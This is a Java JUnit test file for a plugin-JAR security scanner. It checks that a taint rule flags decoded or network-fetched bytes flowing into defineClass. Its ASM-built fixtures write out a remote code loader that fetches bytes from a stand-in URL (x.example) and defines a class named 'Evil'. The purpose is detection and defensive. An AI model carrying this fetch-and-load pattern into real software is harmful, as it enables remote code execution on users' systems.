package dev.pluginguard.engine;

import dev.pluginguard.engine.model.Finding;
import dev.pluginguard.engine.model.ScanResult;
import dev.pluginguard.engine.model.Severity;
import dev.pluginguard.support.JarBuilder;
import org.junit.jupiter.api.Test;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;

import java.util.List;
import java.util.function.Consumer;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Intraprocedural taint tracking (Phase&nbsp;2 deep static): a finding is raised only when external
 * data (network read / decoded blob) actually <em>flows into</em> {@code defineClass}, not merely
 * because the capability is present. This is the data-flow-confirmed remote/encrypted code loader.
 */
@SpringBootTest
class Phase5TaintTest {

    @Autowired
    AnalysisEngine engine;

    @Test
    void decodedBytesFlowingIntoDefineClassAreFlagged() {
        byte[] cls = clazz("com/x/Decoder", mv -> {
            // byte[] b = Base64.getDecoder().decode("AAAA");
            mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/util/Base64", "getDecoder",
                    "()Ljava/util/Base64$Decoder;", false);
            mv.visitLdcInsn("AAAA");
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/util/Base64$Decoder", "decode",
                    "(Ljava/lang/String;)[B", false);
            mv.visitVarInsn(Opcodes.ASTORE, 1);
            defineClassFromLocal(mv, 1);
        });

        Finding f = findRule(scan("t1", "decoder.jar", "com.x.Decoder", cls), "TAINT_REMOTE_CODE_LOAD");
        assertThat(f).isNotNull();
        assertThat(f.severity()).isEqualTo(Severity.CRITICAL);
        assertThat(f.evidence()).contains("decoded");
    }

    @Test
    void networkBytesFlowingIntoDefineClassAreFlagged() {
        byte[] cls = clazz("com/x/Net", mv -> {
            // byte[] b = new URL("http://x").openStream().readAllBytes();
            mv.visitTypeInsn(Opcodes.NEW, "java/net/URL");
            mv.visitInsn(Opcodes.DUP);
            mv.visitLdcInsn("http://x.example/p");
            mv.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/net/URL", "<init>", "(Ljava/lang/String;)V", false);
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/net/URL", "openStream",
                    "()Ljava/io/InputStream;", false);
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/InputStream", "readAllBytes", "()[B", false);
            mv.visitVarInsn(Opcodes.ASTORE, 1);
            defineClassFromLocal(mv, 1);
        });

        Finding f = findRule(scan("t2", "net.jar", "com.x.Net", cls), "TAINT_REMOTE_CODE_LOAD");
        assertThat(f).isNotNull();
        assertThat(f.evidence()).contains("network");
    }

    @Test
    void localBytesIntoDefineClassAreNotTaintFlagged() {
        byte[] cls = clazz("com/x/Local", mv -> {
            // byte[] b = new byte[0];  — not external data
            mv.visitInsn(Opcodes.ICONST_0);
            mv.visitIntInsn(Opcodes.NEWARRAY, Opcodes.T_BYTE);
            mv.visitVarInsn(Opcodes.ASTORE, 1);
            defineClassFromLocal(mv, 1);
        });

        ScanResult result = scan("t3", "local.jar", "com.x.Local", cls);
        assertThat(ruleIds(result)).doesNotContain("TAINT_REMOTE_CODE_LOAD");
        // The capability itself is still reported.
        assertThat(ruleIds(result)).contains("BYTECODE_DEFINE_CLASS");
    }

    // --- helpers -----------------------------------------------------------------------------

    /** Emits {@code getSystemClassLoader().defineClass("Evil", <local>, 0, <local>.length)}. */
    private static void defineClassFromLocal(MethodVisitor mv, int bytesLocal) {
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/ClassLoader", "getSystemClassLoader",
                "()Ljava/lang/ClassLoader;", false);
        mv.visitLdcInsn("Evil");
        mv.visitVarInsn(Opcodes.ALOAD, bytesLocal);
        mv.visitInsn(Opcodes.ICONST_0);
        mv.visitVarInsn(Opcodes.ALOAD, bytesLocal);
        mv.visitInsn(Opcodes.ARRAYLENGTH);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/ClassLoader", "defineClass",
                "(Ljava/lang/String;[BII)Ljava/lang/Class;", false);
        mv.visitInsn(Opcodes.POP);
    }

    private static byte[] clazz(String internalName, Consumer<MethodVisitor> body) {
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, internalName, null, "java/lang/Object", null);

        MethodVisitor ctor = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        ctor.visitCode();
        ctor.visitVarInsn(Opcodes.ALOAD, 0);
        ctor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        ctor.visitInsn(Opcodes.RETURN);
        ctor.visitMaxs(0, 0);
        ctor.visitEnd();

        MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC, "run", "()V", null, null);
        mv.visitCode();
        body.accept(mv);
        mv.visitInsn(Opcodes.RETURN);
        mv.visitMaxs(0, 0);
        mv.visitEnd();

        cw.visitEnd();
        return cw.toByteArray();
    }

    private ScanResult scan(String id, String fileName, String mainClass, byte[] classBytes) {
        byte[] jar = new JarBuilder()
                .addRawEntry(mainClass.replace('.', '/') + ".class", classBytes)
                .addResource("plugin.yml",
                        "name: Test\nversion: \"1.0\"\nmain: " + mainClass + "\napi-version: \"1.21\"\n")
                .build();
        return engine.analyze(id, fileName, jar);
    }

    private static Finding findRule(ScanResult result, String ruleId) {
        return result.findings().stream().filter(f -> f.ruleId().equals(ruleId)).findFirst().orElse(null);
    }

    private static List<String> ruleIds(ScanResult result) {
        return result.findings().stream().map(Finding::ruleId).toList();
    }
}
